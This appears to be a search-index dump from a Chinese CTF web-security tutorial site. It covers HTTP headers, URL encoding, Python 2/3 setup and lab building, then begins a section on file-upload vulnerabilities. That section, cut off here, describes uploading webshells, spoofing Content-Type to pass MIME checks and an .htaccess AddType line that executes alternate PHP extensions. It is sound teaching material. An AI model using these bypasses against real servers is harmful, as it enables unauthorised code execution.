\u5224\u65ad\u8bf7\u6c42\u5b9e\u4f53\u7684Etag\u662f\u5426\u5305\u542b\u5728If-None-Match\u4e2d\uff0c\u5982\u679c\u5305\u542b\uff0c\u5219\u8fd4\u56de304\uff0c\u4f7f\u7528\u7f13\u5b58\uff0c\u89c1Etag If-Modified-Since: \u5224\u65ad\u4fee\u6539\u65f6\u95f4\u662f\u5426\u4e00\u81f4\uff0c\u5982\u679c\u4e00\u81f4\uff0c\u5219\u4f7f\u7528\u7f13\u5b58 If-Match: \u4e0eIf-None-Match\u76f8\u53cd If-Unmodified-Since: \u4e0eIf-Modified-Since\u76f8\u53cd Referer: \u8868\u660e\u8fd9\u4e2a\u8bf7\u6c42\u53d1\u8d77\u7684\u6e90\u5934 User-Agent: \u8fd9\u4e2a\u5927\u5bb6\u76f8\u4fe1\u5e94\u8be5\u5f88\u719f\u6089\u4e86\uff0c\u5c31\u662f\u7ecf\u5e38\u7528\u6765\u505a\u6d4f\u89c8\u5668\u68c0\u6d4b\u7684userAgent\u3002 Cache-Control: \u7f13\u5b58\u7b56\u7565\uff0c\u5982max-age:100\uff0c\u8be6\u89c1\u5b98\u65b9\u6587\u6863 Connection: \u8fde\u63a5\u9009\u9879\uff0c\u4f8b\u5982\u662f\u5426\u5141\u8bb8\u4ee3\u7406 Content-Encoding: \u8fd4\u56de\u5185\u5bb9\u7684\u7f16\u7801\uff0c\u5982gzip Content-Language: \u8fd4\u56de\u5185\u5bb9\u7684\u8bed\u8a00 Content-Length: \u8fd4\u56de\u5185\u5bb9\u7684\u5b57\u8282\u957f\u5ea6 Content-Type: \u8fd4\u56de\u5185\u5bb9\u7684\u5a92\u4f53\u7c7b\u578b\uff0c\u5982text/html Data: \u8fd4\u56de\u65f6\u95f4 Etag: entity tag\uff0c\u5b9e\u4f53\u6807\u7b7e\uff0c\u7ed9\u6bcf\u4e2a\u5b9e\u4f53\u751f\u6210\u4e00\u4e2a\u5355\u72ec\u7684\u503c\uff0c\u7528\u4e8e\u5ba2\u6237\u7aef\u7f13\u5b58\uff0c\u4e0eIf-None-Match\u914d\u5408\u4f7f\u7528 Expires: \u8bbe\u7f6e\u7f13\u5b58\u8fc7\u671f\u65f6\u95f4\uff0cCache-Control\u4e5f\u4f1a\u76f8\u5e94\u53d8\u5316 Last-Modified: \u6700\u8fd1\u4fee\u6539\u65f6\u95f4\uff0c\u7528\u4e8e\u5ba2\u6237\u7aef\u7f13\u5b58\uff0c\u4e0eIf-Modified-Since\u914d\u5408\u4f7f\u7528 Pragma: \u4f3c\u4e4e\u548cCache-Control\u5dee\u4e0d\u591a\uff0c\u7528\u4e8e\u65e7\u7684\u6d4f\u89c8\u5668 Server: \u670d\u52a1\u5668\u4fe1\u606f\u3002 Vary: WEB\u670d\u52a1\u5668\u7528\u8be5\u5934\u90e8\u7684\u5185\u5bb9\u544a\u8bc9 Cache \u670d\u52a1\u5668\uff0c\u5728\u4ec0\u4e48\u6761\u4ef6\u4e0b\u624d\u80fd\u7528\u672c\u54cd\u5e94\u6240\u8fd4\u56de\u7684\u5bf9\u8c61\u54cd\u5e94\u540e\u7eed\u7684\u8bf7\u6c42\u3002\u5047\u5982\u6e90WEB\u670d\u52a1\u5668\u5728\u63a5\u5230\u7b2c\u4e00\u4e2a\u8bf7\u6c42\u6d88\u606f\u65f6\uff0c\u5176\u54cd\u5e94\u6d88\u606f\u7684\u5934\u90e8\u4e3a\uff1aContent-Encoding: gzip; Vary: Content-Encoding\u90a3\u4e48 Cache \u670d\u52a1\u5668\u4f1a\u5206\u6790\u540e\u7eed\u8bf7\u6c42\u6d88\u606f\u7684\u5934\u90e8\uff0c\u68c0\u67e5\u5176 Accept-Encoding\uff0c\u662f\u5426\u8ddf\u5148\u524d\u54cd\u5e94\u7684 Vary \u5934\u90e8\u503c\u4e00\u81f4\uff0c\u5373\u662f\u5426\u4f7f\u7528\u76f8\u540c\u7684\u5185\u5bb9\u7f16\u7801\u65b9\u6cd5\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u9632\u6b62 Cache \u670d\u52a1\u5668\u7528\u81ea\u5df1 Cache \u91cc\u9762\u538b\u7f29\u540e\u7684\u5b9e\u4f53\u54cd\u5e94\u7ed9\u4e0d\u5177\u5907\u89e3\u538b\u80fd\u529b\u7684\u6d4f\u89c8\u5668</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#4url","title":"4.url\u7f16\u7801\u96c6","text":"<p>\u5185\u5bb9\u8f83\u957f\uff0c\u5c55\u5f00\u67e5\u770b</p> \u70b9\u51fb\u5c55\u5f00/\u6536\u8d77 ASCII \u5b57\u7b26 URL-\u7f16\u7801 space %20 ! %21 \" %22 # %23 $ %24 % %25 &amp; %26 ' %27 ( %28 ) %29 * %2A + %2B , %2C - %2D . %2E / %2F 0 %30 1 %31 2 %32 3 %33 4 %34 5 %35 6 %36 7 %37 8 %38 9 %39 : %3A ; %3B &lt; %3C = %3D &gt; %3E ? %3F @ %40 A %41 B %42 C %43 D %44 E %45 F %46 G %47 H %48 I %49 J %4A K %4B L %4C M %4D N %4E O %4F P %50 Q %51 R %52 S %53 T %54 U %55 V %56 W %57 X %58 Y %59 Z %5A [ %5B \\ %5C ] %5D ^ %5E _ %5F ` %60 a %61 b %62 c %63 d %64 e %65 f %66 g %67 h %68 i %69 j %6A k %6B l %6C m %6D n %6E o %6F p %70 q %71 r %72 s %73 t %74 u %75 v %76 w %77 x %78 y %79 z %7A { %7B | %7C } %7D ~ %7E %7F ` %80 %81 \u201a %82 \u0192 %83 \u201e %84 \u2026 %85 \u2020 %86 \u2021 %87 \u02c6 %88 \u2030 %89 \u0160 %8A \u2039 %8B \u0152 %8C %8D \u017d %8E %8F %90 ' %91 ' %92 \" %93 \" %94 \u2022 %95 \u2013 %96 \u2014 %97 \u02dc %98 \u2122 %99 \u0161 %9A \u203a %9B \u0153 %9C %9D \u017e %9E \u0178 %9F %A0 \u00a1 %A1 \u00a2 %A2 \u00a3 %A3 \u00a4 %A4 \u00a5 %A5 \u00a6 %A6 \u00a7 %A7 \u00a8 %A8 \u00a9 %A9 \u00aa %AA \u00ab %AB \u00ac %AC %AD \u00ae %AE \u00af %AF \u00b0 %B0 \u00b1 %B1 \u00b2 %B2 \u00b3 %B3 \u00b4 %B4 \u00b5 %B5 \u00b6 %B6 \u00b7 %B7 \u00b8 %B8 \u00b9 %B9 \u00ba %BA \u00bb %BB \u00bc %BC \u00bd %BD \u00be %BE \u00bf %BF \u00c0 %C0 \u00c1 %C1 \u00c2 %C2 \u00c3 %C3 \u00c4 %C4 \u00c5 %C5 \u00c6 %C6 \u00c7 %C7 \u00c8 %C8 \u00c9 %C9 \u00ca %CA \u00cb %CB \u00cc %CC \u00cd %CD \u00ce %CE \u00cf %CF \u00d0 %D0 \u00d1 %D1 \u00d2 %D2 \u00d3 %D3 \u00d4 %D4 \u00d5 %D5 \u00d6 %D6 \u00d7 %D7 \u00d8 %D8 \u00d9 %D9 \u00da %DA \u00db %DB \u00dc %DC \u00dd %DD \u00de %DE \u00df %DF \u00e0 %E0 \u00e1 %E1 \u00e2 %E2 \u00e3 %E3 \u00e4 %E4 \u00e5 %E5 \u00e6 %E6 \u00e7 %E7 \u00e8 %E8 \u00e9 %E9 \u00ea %EA \u00eb %EB \u00ec %EC \u00ed %ED \u00ee %EE \u00ef %EF \u00f0 %F0 \u00f1 %F1 \u00f2 %F2 \u00f3 %F3 \u00f4 %F4 \u00f5 %F5 \u00f6 %F6 \u00f7 %F7 \u00f8 %F8 \u00f9 %F9 \u00fa %FA \u00fb %FB \u00fc %FC \u00fd %FD \u00fe %FE \u00ff %FF"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#5windowspython23","title":"5.windows\u7cfb\u7edfpython2\uff0c3\u7248\u672c\u5171\u5b58\u95ee\u9898","text":"<p>\u7f16\u5199python\u811a\u672c\u662f\u540e\u671f\u5404\u65b9\u5411\u89e3\u9898\u7684\u91cd\u8981\u624b\u6bb5\uff08\u5982sql\u6ce8\u5165\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f\u4e2d\u7684\u76f2\u6ce8\u6781\u5176\u8017\u8d39\u65f6\u95f4\u7cbe\u529b\uff0c\u7eaf\u4eba\u529b\u51e0\u4e4e\u65e0\u6cd5\u5b8c\u6210\uff09\u4f46\u662f\u90e8\u5206\u5de5\u5177\u5bf9python\u6709\u7248\u672c\u9650\u5236\uff0c\u6216python2\uff0c3\u7248\u672c\u4f1a\u5f97\u5230\u4e0d\u540c\u7ed3\u679c\uff08\u5982\u5728flask\u6846\u67b6\u7684SSTI\u6f0f\u6d1e\u4e2dpython2\u4e0epython3\u5185\u7f6e\u7684\u7d22\u5f15\u503c\u4e0d\u540c\uff09 \u76ee\u524d\uff0cPython3\u548cPython2\u4e92\u76f8\u5e76\u4e0d\u5b8c\u5168\u517c\u5bb9\uff0c\u8fd9\u5c31\u9020\u6210\u4e86\u5f88\u591aPython\u4ee3\u7801\u6216\u8005\u662f\u811a\u672c\u5728\u7248\u672c\u4e0d\u5bf9\u5e94\u7684\u60c5\u51b5\u4e0b\u65e0\u6cd5\u6267\u884c\uff0c\u6240\u4ee5\u8bf4\uff0c\u5728\u4e00\u53f0\u7535\u8111\u4e0a\u540c\u65f6\u62e5\u6709Python2\u548cPython3\u662f\u5f88\u6709\u5fc5\u8981\u7684\uff0c\u4e5f\u80fd\u66f4\u9ad8\u6548\u7684\u5904\u7406\u5de5\u4f5c\uff0c\u8282\u7701\u65f6\u95f4\u3002 \u5176\u5b9e\u8981\u89e3\u51b3Python2\u548cPython3\u5171\u5b58\u4e5f\u5f88\u7b80\u5355\uff0c\u63d0\u4f9b\u5982\u4e0b\u65b9\u6848\uff1a</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#1python2python3","title":"1\u3001\u4e0b\u8f7dPython2\u548cPython3\u7684\u5b89\u88c5\u5305(\u6216\u8005\u53eb\u89e3\u91ca\u5668)","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttps://www.python.org/downloads/windows/ \u6839\u636e\u81ea\u5df1\u9700\u8981\u7684\u7248\u672c\u4e0b\u8f7d\u5373\u53ef\uff0c\u5b89\u88c5\u5305\u90fd\u6bd4\u8f83\u5c0f\u3002  \u4e0b\u8f7d\u540e\uff0c\u76f4\u63a5\u5b89\u88c5\u5373\u53ef\u3002 \u5b89\u88c5\u8fc7\u7a0b\u6ce8\u610f\u5b89\u88c5\u8def\u5f84\uff0c\u9ed8\u8ba4\u662f\u5b89\u88c5\u5230C\u76d8\uff0c\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8fdb\u884c\u66f4\u6539\u5b89\u88c5\u8def\u5f84\u3002 </p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#2_1","title":"2\u3001\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf","text":"<p>\u7531\u4e8e\u6211\u4eec\u5b89\u88c5\u4e86\u4e24\u4e2a\u7248\u672c\u7684Python\uff0c\u56e0\u6b64\u4e3a\u4e86\u65b9\u4fbf\u7cfb\u7edf\u80fd\u591f\u51c6\u786e\u8bc6\u522b\u5230\u6307\u5b9a\u7684Python\u7248\u672c\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u3002 \u5c06Python\u5b89\u88c5\u8def\u5f84\u53ca\u5176\u5b89\u88c5\u8def\u5f84\u4e0b\u7684Scripts\u8bbe\u7f6e\u5230Path\u53d8\u91cf\u91cc\u3002 \u8fd9\u91cc\u8bbe\u7f6eScripts\u6587\u4ef6\u5939\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u65b9\u4fbf\u8bc6\u522bpip\u3002  </p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#3python","title":"3\u3001\u4fee\u6539Python\u7f16\u8bd1\u5668\u7684\u540d\u5b57","text":"<p>\u4e3a\u4e86\u80fd\u591f\u51c6\u786e\u5b9a\u4f4dPython2\u548cPython3\uff0c\u6211\u4eec\u9700\u8981\u5c06\u9ed8\u8ba4\u7684Python\u7f16\u8f91\u5668\u7684\u540d\u79f0\u8fdb\u884c\u4fee\u6539\u3002 NO.1. \u4fee\u6539Python2\u5b89\u88c5\u76ee\u5f55\u4e0b\uff1apython.exe\u4fee\u6539\u4e3apython2.exe\uff0cpythonw.exe\u4fee\u6539\u4e3apythonw2.exe NO.2. \u4fee\u6539Python3\u5b89\u88c5\u76ee\u5f55\u4e0b\uff1apython.exe\u4fee\u6539\u4e3apython3.exe\uff0cpythonw.exe\u4fee\u6539\u4e3apythonw3.exe \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u5728cmd\u547d\u4ee4\u884c\u4e0b\u5206\u522b\u8f93\u5165python2\u548cpython3\u5c31\u53ef\u4ee5\u8fdb\u5165\u5bf9\u5e94\u7248\u672c\u7684python\u73af\u5883\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#4pip","title":"4\u3001\u8bbe\u7f6epip","text":"<p>python\u73af\u5883\u5728\u5b89\u88c5\u5305\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u5230\u5305\u7ba1\u7406\u5de5\u5177\u2014\u2014pip\uff0c\u800cpip\u4e5f\u662f\u9700\u8981\u5bf9\u5e94\u7248\u672c\u7684\u3002\u5728python\u7684\u5b89\u88c5\u76ee\u5f55Scripts\u4e0b\u53ef\u4ee5\u770b\u5230 \u9ed8\u8ba4\u662f\u5b58\u5728pip\u7684\uff0c\u4f46\u662f\u5728\u547d\u4ee4\u884c\u4e0b\uff0c\u5e76\u4e0d\u80fd\u76f4\u63a5\u5b9a\u4f4d\u5230\uff0c\u56e0\u6b64\u9700\u8981\u91cd\u65b0\u5206\u522b\u5b89\u88c5\u4e24\u4e2a\u7248\u672c\u5bf9\u5e94\u7684pip\uff0c\u4f7f\u5f97\u4e24\u4e2apython\u7248\u672c\u7684pip\u4e5f\u80fd\u591f\u5171\u5b58\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#python2","title":"python2\uff1a","text":"<p><code>python2 -m pip install --upgrade pip</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#python3","title":"python3:","text":"<p><code>python3 -m pip install --upgrade pip</code> \u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528pip2 -V \u6216\u8005pip3 -V\u67e5\u770b\u5bf9\u5e94\u7684pip\u7248\u672c\u4e86\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%9F%BA%E7%A1%80%E7%AF%87/#6","title":"6.\u5173\u4e8e\u9776\u573a\u73af\u5883\u642d\u5efa","text":"<p>web\u7684\u5341\u5927\u6f0f\u6d1e\u5f53\u4e2d\u6709\u5f88\u591a\u6f0f\u6d1e\u5728github\u4e0a\u90fd\u80fd\u627e\u5230\u5927\u5e08\u5085\u5236\u4f5c\u51fa\u6765\u4f9b\u5b66\u4e60\u7528\u7684\u9776\u573a\uff0c\u8fd9\u91cc\u9488\u5bf9\u4e00\u4e9b\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898\u4f9b\u5927\u5bb6\u53c2\u8003 \u9996\u5148\u5927\u5bb6\u9700\u8981\u4e86\u89e3LAMP\u548cLNMP\uff0c\u4e5f\u5c31\u662flinux\uff0capache/nginx\uff0cmysql\uff0cphp \u8fd9\u91ccLinux\u73af\u5883\u7684\u5b9e\u73b0\u9700\u8981\u7528\u5230\u865a\u62df\u673a\uff0c\u4e5f\u5c31\u662fVMware\uff0c\u5927\u5bb6\u4f7f\u7528\u793e\u56e2\u7ed9\u7684kali\u955c\u50cf\uff0c\u81ea\u884c\u767e\u5ea6\u4e00\u4e0b\u5b89\u88c5\u6559\u7a0b\u914d\u7f6e\u5373\u53ef  mysql\u662f\u6570\u636e\u5e93\u7684\u4e00\u79cd\uff0c\u5bf9\u4e8e\u4e13\u4e1a\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528navicat\u53bb\u7ba1\u7406\u6570\u636e\u5e93\uff0c\u8fd9\u91cc\u4ec5\u4f5c\u4e86\u89e3\uff0c\u5bf9\u4e8e\u73af\u5883\u642d\u5efa\uff0c\u4f7f\u7528PHPstudy\u5373\u53ef\u6ee1\u8db3\u6211\u4eec\u5168\u90e8\u7684\u9700\u6c42 phpstudy\u96c6\u6210\u4e86php\uff0cmysql\u548capache\u3001nginx\u4e24\u4e2aweb\u4e2d\u95f4\u4ef6\uff08\u4e0d\u77e5\u9053\u4ec0\u4e48\u662f\u4e2d\u95f4\u4ef6\u7684\u81ea\u5df1\u53bb\u767e\u5ea6\uff09\uff0c\u9700\u8981\u4f7f\u7528\u65f6\u6309\u9700\u6c42\u968f\u65f6\u542f\u505c\u5373\u53ef  \u90a3\u4e48\u5982\u4f55\u642d\u5efa\u4e00\u4e2a\u65b0\u73af\u5883\u5462  phpstudy\u7684\u76ee\u5f55\u4e0b\u9ed8\u8ba4\u6709\u4e00\u4e2aWWW\u76ee\u5f55\uff0c\u4e0b\u6709\u4e00\u4e2alocalhost\uff0c\u5373\u672c\u5730\u7f51\u7ad9 \u60f3\u8981\u521b\u5efa\u65b0\u7f51\u7ad9\uff0c\u9075\u7167\u56fe\u4e2d\u7684\u51e0\u4e2a\u6b65\u9aa4\u5373\u53ef \u57df\u540d\u8bbe\u7f6e\u8d77\u6765\u9664\u4e86\u4e0d\u8981\u6709\u4e2d\u6587\u548c\u7b26\u53f7\u4e4b\u5916\u975e\u5e38\u81ea\u7531\uff0c\u5176\u5b9e\u8d28\u5c31\u662f\u5728\u6839\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u53ef\u4ee5\u8bbf\u95ee\u76ee\u5f55\u4e0b\u8d44\u6e90\u7684\u6587\u4ef6\u5939\uff0c\u8fd9\u4e00\u70b9\u5f88\u597d\u7406\u89e3 \u7aef\u53e3\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u5373\u53ef\uff0c\u82e5\u60f3\u6539\u53d8\u7aef\u53e3\uff0c\u8bb0\u5f97\u907f\u5f00\u5176\u4ed6\u670d\u52a1\u5360\u7528\u7684\u7aef\u53e3\uff0cphpstudy\u63d0\u4f9b\u4e86\u7aef\u53e3\u68c0\u6d4b\u7684\u529f\u80fd\uff0c\u80fd\u591f\u65b9\u4fbf\u5730\u6d4b\u8bd5\u548c\u67e5\u770b\u7aef\u53e3\u662f\u5426\u88ab\u5360\u7528\uff0c\u907f\u514d\u51b2\u7a81  \u6839\u76ee\u5f55\u53ef\u4ee5\u81ea\u5b9a\u4e49\uff0c\u9ed8\u8ba4\u4f1a\u8bbe\u5b9a\u4e3a\u8f6f\u4ef6\u5b89\u88c5\u8def\u5f84\u7684WWW\u76ee\u5f55\u4e0b\uff0c\u6bd4\u5982\u6211\u8fd9\u91cc\u7684\u76ee\u5f55\u662fD:/phpstudy_pro/WWW/\uff0c\u8bbe\u5728E\u76d8F\u76d8\u4e5f\u90fd\u662f\u53ef\u4ee5\u7684\uff08\u5c31\u662f\u522b\u653eC\u76d8\uff09 \u5efa\u8bae\u4e0d\u540c\u6f0f\u6d1e\u7684\u9776\u573a \u81f3\u4e8ephp\u7248\u672c\u95ee\u9898\uff0c\u662f\u4e00\u4e2a\u975e\u5e38\u503c\u5f97\u8bf4\u7684\u70b9\uff0c\u8fd9\u91cc\u6682\u4e0d\u5c55\u5f00\u8bf4\uff0c\u5728\u540e\u9762\u7684\u6f0f\u6d1e\u5b66\u4e60\u5f53\u4e2d\u8fd8\u4f1a\u5206\u522b\u63d0\u5230\uff0c\u5728\u7f51\u7ad9\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u5bf9\u7248\u672c\u8fdb\u884c\u4fee\u6539  \u9664\u4e86php\u7248\u672c\uff0c\u5176\u4ed6\u8f6f\u4ef6\u7684\u7248\u672c\u7ba1\u7406\u53ef\u4ee5\u5728\u4e0b\u9762\u627e\u5230  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u65e0\u8bba\u66f4\u6539\u4e86\u54ea\u4e00\u9879\u670d\u52a1\u7684\u7248\u672c\uff0c\u90fd\u9700\u8981\u91cd\u65b0\u542f\u52a8\u624d\u80fd\u751f\u6548 \u4e00\u4e9b\u60c5\u51b5\u4e0b\u8fd8\u9700\u8981\u4fee\u6539php\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u6bcf\u4e2a\u7248\u672c\u5bf9\u5e94\u4e00\u4e2aini\u6587\u4ef6\uff0c\u7528txt\u6253\u5f00\u5373\u53ef </p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/","title":"\u6587\u4ef6\u4e0a\u4f20\u7bc7\u2705","text":"<p> \u7ea6 1299 \u4e2a\u5b57  17 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_1","title":"\u6587\u4ef6\u4e0a\u4f20","text":"<p>Note</p> <p>\u90e8\u5206\uff0c\u671f\u5f85\u8865\u5145</p> <p>\u539f\u7406</p> <p>\u4e00\u4e9bweb\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5141\u8bb8\u4e0a\u4f20\u56fe\u7247\u3001\u89c6\u9891\u3001\u5934\u50cf\u548c\u8bb8\u591a\u5176\u4ed6\u7c7b\u578b\u7684\u6587\u4ef6\u5230\u670d\u52a1\u5668\u4e2d\u3002</p> <p>\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u5c31\u662f\u5229\u7528\u670d\u52a1\u7aef\u4ee3\u7801\u5bf9\u6587\u4ef6\u4e0a\u4f20\u8def\u5f84\u53d8\u91cf\u8fc7\u6ee4\u4e0d\u4e25\u683c\u5c06\u53ef\u6267\u884c\u7684\u6587\u4ef6\u4e0a\u4f20\u5230\u4e00\u4e2a\u5230\u670d\u52a1\u5668\u4e2d \uff0c\u518d\u901a\u8fc7URL\u53bb\u8bbf\u95ee\u4ee5\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800cgetshell\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#ctf","title":"CTF","text":"<p>\u4e00\u822c\u4e3aphp\u7684\u670d\u52a1\u7aef</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_2","title":"\u65e0\u9a8c\u8bc1","text":"<p>\u76f4\u63a5\u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c\u6216\u8005WebShell\u811a\u672c\u5373\u53ef\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#js","title":"js\u68c0\u6d4b","text":"<p>\u5373\u5728\u524d\u7aef\u68c0\u6d4b</p> <p>\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u53d1\u9001\u4e0a\u4f20\u6587\u4ef6\u7684\u6570\u636e\u5305\uff0c\u4e5f\u53ef\u4ee5\u7981\u7528\u6216\u4fee\u6539js\u540e\u53d1\u9001</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#mime","title":"MIME\u7c7b\u578b\u68c0\u6d4b","text":"<p><code>multipurpose Internet mail extensions\u591a\u7528\u9014\u4e92\u8054\u7f51\u90ae\u4ef6\u6269\u5c55\u7c7b\u578b</code></p> MIME \u63cf\u8ff0 text/html HTML\u683c\u5f0f application/json JSON\u6570\u636e\u683c\u5f0f multipart/form-data \u6587\u4ef6\u4e0a\u4f20\uff08\u4e8c\u8fdb\u5236\u6570\u636e) image/jpeg jpg\u56fe\u7247\u683c\u5f0f <p>\u8fd9\u4e2a\u6570\u636e\u662f\u6d4f\u89c8\u5668\u81ea\u52a8\u6253\u5305\u751f\u6210\u7684\uff0c\u5c5e\u4e8e\u540e\u7aef\u4ea4\u4e92\u7684\u5185\u5bb9\u3002</p> <p>\u901a\u8fc7MIME\u670d\u52a1\u7aef\u53ef\u4ee5\u5f97\u77e5\u5ba2\u6237\u7aef\u4e0a\u4f20\u7684\u6570\u636e\u7c7b\u578b\u548c\u8bf7\u6c42\u7684\u6570\u636e\u7c7b\u578b\uff0c\u5e76\u80fd\u591f\u5c06\u5bf9\u6570\u636e\u7c7b\u578b\u7684\u54cd\u5e94\u7ed3\u679c\u8fd4\u56de\u5230\u5ba2\u6237\u7aef</p> <p>\u670d\u52a1\u5668\u4ee3\u7801\u5224\u65ad<code>$_FILES[\"file\"][\"type\"]</code>\u662f\u4e0d\u662f\u56fe\u7247\u683c\u5f0f\uff08<code>image/jpeg</code>\u3001<code>image/png</code>\u3001<code>image/gif</code>\uff09\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5219\u4e0d\u5141\u8bb8\u4e0a\u4f20\u8be5\u6587\u4ef6\u3002</p> <p>\u7ed5\u8fc7\u65b9\u6cd5\uff1a</p> <p>\u901a\u8fc7\u4fee\u6539\u6570\u636e\u5305\u4e2d\u7684<code>content-type</code>\u5373\u53ef\u66f4\u6539</p> <p>\u6293\u5305\u540e\u66f4\u6539Content-Type\u4e3a\u5141\u8bb8\u7684\u7c7b\u578b\u7ed5\u8fc7\u8be5\u4ee3\u7801\u9650\u5236\uff0c\u6bd4\u5982\u5c06php\u6587\u4ef6\u7684<code>Content-Type:application/octet-stream</code>\u4fee\u6539\u4e3a<code>image/jpeg</code>\u3001<code>image/png</code>\u3001<code>image/gif</code>\u7b49\u5c31\u53ef\u4ee5</p> <p>\u5e38\u89c1MIMETYPE</p> <p>audio/mpeg -&gt; .mp3 </p> <p>application/msword -&gt; .doc </p> <p>application/octet-stream -&gt; .exe </p> <p>application/pdf -&gt; .pdf </p> <p>application/x-javascript -&gt; .js </p> <p>application/x-rar -&gt; .rar </p> <p>application/zip -&gt; .zip </p> <p>image/gif -&gt; .gif </p> <p>image/jpeg -&gt; .jpg / .jpeg </p> <p>image/png -&gt; .png </p> <p>text/plain -&gt; .txt </p> <p>text/html -&gt; .html </p> <p>video/mp4 -&gt; .mp4</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_3","title":"\u7b49\u4ef7\u6269\u5c55\u540d","text":"<p>\u524d\u63d0\u662f\u670d\u52a1\u5668\u914d\u7f6e\u5141\u8bb8</p> <ul> <li> <p>Apache</p> <p>\u5728<code>.htaccess</code>\u6216<code>httpd.conf</code>\u4e2d\uff1a</p> <pre><code>AddType application/x-httpd-php .php .php3 .phtml\n</code></pre> <p>\u5e38\u7528\u540e\u7f00\uff1a<code>*.php</code> <code>*.php3</code> <code>*.php4</code> <code>*.php5</code> <code>*.phtml</code> <code>*.pht</code></p> 